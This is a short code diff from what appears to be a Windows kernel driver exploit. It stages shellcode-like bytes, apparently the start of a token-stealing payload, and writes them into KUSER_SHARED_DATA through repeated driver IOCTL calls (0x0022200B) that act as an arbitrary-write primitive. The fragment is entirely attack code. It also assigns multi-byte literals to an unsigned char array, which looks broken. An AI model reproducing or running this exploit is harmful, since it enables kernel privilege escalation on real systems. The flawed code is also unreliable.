@@ -299,7 +299,10 @@ const unsigned char payload[] = {
 */
 
     payload[0] = 0x0000018825048b4865;
+    payload[1] = 0x000000B8808B4800;
 
-    SendToDriver(driverHandle,0x0022200B,(void*) &payload[0], (void*) (((unsigned long long) KUSER_SHARED_DATA)+1) );
+
+    SendToDriver(driverHandle,0x0022200B,(void*) &payload[0], (void*) (((unsigned long long) KUSER_SHARED_DATA)+0));
+    SendToDriver(driverHandle,0x0022200B,(void*) &payload[1], (void*) (((unsigned long long) KUSER_SHARED_DATA)+8) );
     return (void*) KUSER_SHARED_DATA;
 }
